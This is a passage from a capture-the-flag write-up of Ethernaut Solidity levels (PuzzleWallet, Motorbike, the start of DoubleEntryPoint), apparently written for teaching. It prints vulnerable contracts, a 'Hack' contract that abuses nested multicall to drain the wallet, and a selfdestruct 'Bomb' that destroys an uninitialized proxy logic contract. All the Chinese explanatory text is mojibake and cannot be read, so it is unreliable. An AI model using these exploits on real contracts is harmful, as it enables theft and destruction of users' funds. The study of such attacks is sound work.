<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Insufficient balance&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">to</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="p">}(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Execution failed&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">multicall</span><span class="p">(</span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">onlyWhitelisted</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">bool</span><span class="w"> </span><span class="nx">depositCalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
<span class="w">            </span><span class="nx">bytes4</span><span class="w"> </span><span class="nx">selector</span><span class="p">;</span>
<span class="w">            </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">selector</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="nx">_data</span><span class="p">,</span><span class="w"> </span><span class="mf">32</span><span class="p">))</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">selector</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">deposit</span><span class="p">.</span><span class="nx">selector</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">require</span><span class="p">(</span><span class="o">!</span><span class="nx">depositCalled</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Deposit can only be called once&quot;</span><span class="p">);</span>
<span class="w">                </span><span class="c1">// Protect against reusing msg.value</span>
<span class="w">                </span><span class="nx">depositCalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">            </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
<span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Error while delegating call&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>
<p>Ë∞ÉÁî®ÈÄªËæëÂêàÁ∫¶ <code>PuzzleWallet</code> Áõ∏ÂÖ≥ÂáΩÊï∞ÈúÄË¶ÅÂú®ÁôΩÂêçÂçïÂÜÖ‰∏îÂè™Êúâ <code>owner</code> ÊâçËÉΩÊ∑ªÂä†ÊåáÂÆöÂú∞ÂùÄÂà∞ÁôΩÂêçÂçï</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">whitelisted</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
<span class="kc">false</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span>
<span class="s2">&quot;&lt;level-address&gt;&quot;</span><span class="w"> </span>
</code></pre></div>
</li>
<li>
<p>Áî±‰∫é‰ΩøÁî®‰ª£ÁêÜË∞ÉÁî®ÁöÑÊñπÂºèÔºå‰ª£ÁêÜÂêàÁ∫¶ÁöÑ <code>pendingAdmin</code> ‰∏éÈÄªËæëÂêàÁ∫¶ÁöÑ <code>owner</code> ÂÖ±‰∫´‰∏Ä‰∏™ slotÔºåÂõ†ËÄåÂèØÂÖàÈÄöËøá <code>proposeNewAdmin</code> Êõ¥Êñ∞ <code>owner</code>ÔºåÈöèÂêéÂ∞ÜÁé©ÂÆ∂Ê∑ªÂä†Âà∞ÁôΩÂêçÂçï‰∏≠</p>
</li>
<li>ÂêåÁêÜÔºå<code>maxBalance</code> ‰∏é <code>admin</code> ÂÖ±‰∫´‰∏Ä‰∏™ slotÔºåËÄå <code>maxBalance</code> ÂèØÈÄöËøá <code>setMaxBalance</code> Êõ¥Êñ∞Ôºå‰ΩÜÈ¶ñÂÖàÈúÄÊ∏ÖÁ©∫‰ª£ÁêÜÂêàÁ∫¶ÁöÑ‰ΩôÈ¢ù</li>
<li><code>execute</code> ‰æùÊçÆ <code>balances</code> ‰∏≠ËÆ∞ÂΩïÁöÑÂØπÂ∫îÂú∞ÂùÄÁöÑ‰ΩôÈ¢ùËøõË°åËΩ¨Ë¥¶ÔºåËÄå <code>balances</code> Âè™ËÉΩÈÄöËøá <code>deposit</code> ÊîπÂèò</li>
<li>
<p>Ê≥®ÊÑèÂà∞ <code>multicall</code> ‰∏≠ <code>depositCalled</code> ‰∏çÊòØÁä∂ÊÄÅÂèòÈáèËÄåÊòØÂáΩÊï∞ÂÜÖÂèòÈáèÔºåÂõ†ËÄåÂµåÂ•óË∞ÉÁî® <code>multicall</code> ÂèØÁªïËøáÈôêÂà∂Âà©Áî®ÂçïÊ¨° transfer ËøõË°åÈáçÂ§ç <code>deposit</code></p>
<div class="highlight"><pre><span></span><code><span class="c1">// ÈÉ®ÁΩ≤ÂêéÂ∞ÜÊîªÂáªÂêàÁ∫¶Ê∑ªÂä†Âà∞ÁôΩÂêçÂçï‰∏≠</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">PuzzleWallet</span><span class="w"> </span><span class="nx">wallet</span><span class="p">;</span>

<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">wallet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">PuzzleWallet</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// msg.value ËÆæÁΩÆ‰∏∫ 0.001 ethÔºåÂç≥‰ª£ÁêÜÂêàÁ∫¶ÂàùÂßã‰ΩôÈ¢ù</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
<span class="w">        </span><span class="nx">bytes</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">subdata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bytes</span><span class="p">[](</span><span class="mf">1</span><span class="p">);</span>
<span class="w">        </span><span class="nx">data</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;deposit()&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">subdata</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<span class="w">        </span><span class="nx">data</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;multicall(bytes[])&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">subdata</span><span class="p">);</span>
<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">multicall</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">        </span><span class="nx">wallet</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p><code>delegatecall</code> ‰øùÊåÅÂêàÁ∫¶Ë¢´Ë∞ÉÁî®Êó∂ÁöÑ <code>msg.value</code></p>
</li>
</ul>
<h2 id="25-motorbike">25. Motorbike<a class="headerlink" href="#25-motorbike" title="Permanent link">&para;</a></h2>
<p>ËÆ© <code>Engine</code> Ëá™ÊØÅÔºå‰Ωø <code>Motorbike</code> ‰∏çÂèØÁî®</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>

<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">&lt;</span><span class="mf">0.7.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-06/utils/Address.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Motorbike</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
<span class="w">    </span><span class="c1">// constant variable does not have a storage slot</span>
<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

<span class="w">    </span><span class="nx">struct</span><span class="w"> </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span>
<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_logic</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nx">isContract</span><span class="p">(</span><span class="nx">_logic</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_logic</span><span class="p">;</span>
<span class="w">        </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_logic</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span>
<span class="w">            </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;initialize()&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Delegates the current call to `implementation`.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_delegate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">implementation</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// solhint-disable-next-line no-inline-assembly</span>
<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">calldatacopy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">calldatasize</span><span class="p">())</span>
<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">gas</span><span class="p">(),</span><span class="w"> </span><span class="nx">implementation</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">calldatasize</span><span class="p">(),</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="w">            </span><span class="nx">returndatacopy</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span>
<span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="nx">result</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">revert</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
<span class="w">            </span><span class="k">default</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">returndatasize</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`. </span>
<span class="w">    </span><span class="c1">// Will run if no other function in the contract matches the call data</span>
<span class="w">    </span><span class="nx">fallback</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">virtual</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_delegate</span><span class="p">(</span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="nx">value</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_getAddressSlot</span><span class="p">(</span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">slot</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">AddressSlot</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">r_slot</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">slot</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Engine</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Initializable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
<span class="w">    </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">upgrader</span><span class="p">;</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">horsePower</span><span class="p">;</span>

<span class="w">    </span><span class="nx">struct</span><span class="w"> </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">initialize</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">initializer</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">horsePower</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000</span><span class="p">;</span>
<span class="w">        </span><span class="nx">upgrader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Upgrade the implementation of the proxy to `newImplementation`</span>
<span class="w">    </span><span class="c1">// subsequently execute the function call</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">upgradeToAndCall</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_authorizeUpgrade</span><span class="p">();</span>
<span class="w">        </span><span class="nx">_upgradeToAndCall</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Restrict to upgrader role</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_authorizeUpgrade</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">upgrader</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Can&#39;t upgrade&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Perform implementation upgrade with security checks for UUPS(Universal Upgradeable Proxy Standard) proxies, and additional setup call.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_upgradeToAndCall</span><span class="p">(</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">,</span>
<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span>
<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// Initial upgrade and setup call</span>
<span class="w">        </span><span class="nx">_setImplementation</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">);</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">            </span><span class="nx">require</span><span class="p">(</span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Call failed&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// Stores a new address in the EIP1967 implementation slot.</span>
<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_setImplementation</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">Address</span><span class="p">.</span><span class="nx">isContract</span><span class="p">(</span><span class="nx">newImplementation</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;ERC1967: new implementation is not a contract&quot;</span><span class="p">);</span>

<span class="w">        </span><span class="nx">AddressSlot</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">r</span><span class="p">;</span>
<span class="w">        </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">r_slot</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">_IMPLEMENTATION_SLOT</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nx">r</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>‰∏éÈÄèÊòé‰ª£ÁêÜÊ®°Âºè‰∏çÂêåÔºåUUPS ‰ª£ÁêÜÊ®°ÂºèÁî±ÈÄªËæëÂêàÁ∫¶Ë¥üË¥£ÂçáÁ∫ßÈÄªËæëÔºåÂõ†ËÄå‰ª£ÁêÜÂêàÁ∫¶ÈÉ®ÁΩ≤ÁöÑ‰ª£‰ª∑ËæÉÂ∞è</li>
<li><code>upgrader</code> ÂèØ‰ª•‰ΩøÁî® <code>upgradeToAndCall()</code> Êõ¥Êñ∞ÈÄªËæëÂêàÁ∫¶Âπ∂Ë∞ÉÁî®</li>
<li><code>Motorbike</code> Âú®ÈÉ®ÁΩ≤Êó∂ÈÄöËøá <code>delegatecall</code> Ë∞ÉÁî® <code>Engine</code> ÁöÑ <code>initialize()</code>Ôºå<code>initialize()</code> ‰ΩøÁî® <code>initializer</code> ÂáΩÊï∞‰øÆÈ•∞Á¨¶ÔºåÈÅøÂÖçÂÜçÊ¨°ÂàùÂßãÂåñ<ul>
<li><code>initializer</code> ‰øÆÈ•∞Á¨¶‰ΩøÁî®Áä∂ÊÄÅÂèòÈáè <code>initialized</code> Âíå <code>initializing</code> ËÆ∞ÂΩïÊàñÂà§Êñ≠ÂàùÂßãÂåñÁä∂ÊÄÅ</li>
</ul>
</li>
<li><code>initialized</code> Â≠òÂÇ®Âú® <code>Motorbike</code> ÂÆû‰æã‰∏≠ÔºåËÄå‰∏çÊòØ <code>Engine</code>ÔºåÂõ†ËÄåÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî® <code>Engine</code> ÂÆû‰æãÁöÑ <code>initialize()</code> ÂÜçÊõ¥Êñ∞ÂÖ∂ÈÄªËæëÂêàÁ∫¶ÁöÑÂú∞ÂùÄÂπ∂Ë∞ÉÁî®</li>
<li><em>‰∏çË¶ÅËÆ©ÈÄªËæëÂêàÁ∫¶Â§Ñ‰∫éÊú™ÂàùÂßãÂåñÁä∂ÊÄÅ</em></li>
</ul>
<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">// Ëé∑Âèñ Engine ÂÆû‰æãÁöÑÂú∞ÂùÄ</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span><span class="p">);</span>
<span class="s2">&quot;0x000000000000000000000000e12c57f61db3891d41ddde5a6669591391ad30ab&quot;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1">// ÈÉ®ÁΩ≤Êñ∞ÁöÑÈÄªËæëÂêàÁ∫¶</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">Bomb</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">fallback</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">selfdestruct</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
<span class="c1">// Ë∞ÉÁî® initialize Êàê‰∏∫ upgraderÔºåÈöèÂêéË∞ÉÁî® upgradeToAndCall() Êõ¥Êñ∞ÈÄªËæëÂêàÁ∫¶</span>
</code></pre></div>
<h3 id="_16">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786">UUPS Proxies: Tutorial (Solidity + JavaScript) - Smart Contracts / Guides and Tutorials - OpenZeppelin Forum</a></li>
<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups">Proxies - OpenZeppelin Docs</a></li>
<li><a href="https://docs.soliditylang.org/en/latest/contracts.html#constants">Constant and Immutable State Variables</a></li>
<li><a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable">Writing Upgradeable Contracts - OpenZeppelin Docs</a></li>
</ul>
<h2 id="26-doubleentrypoint">26. DoubleEntryPoint<a class="headerlink" href="#26-doubleentrypoint" title="Permanent link">&para;</a></h2>
<ul>
<li>Èò≤Ê≠¢ÂêàÁ∫¶ <code>CryptoVault</code> Ë¢´Ê∏ÖÁ©∫‰ª£Â∏Å</li>
<li>ÂÆûÁé∞ËÉΩÂ§üÊ≠£Á°ÆÂëäË≠¶‰ª•Èò≤Ê≠¢ÊΩúÂú®ÊîªÂáªÊàñÊºèÊ¥ûÂà©Áî®ÁöÑ <code>detection bot</code> ÂêàÁ∫¶Âπ∂Âú® <code>Forta</code> Ê≥®ÂÜå</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts-08/access/Ownable.sol&quot;</span><span class="p">;</span>
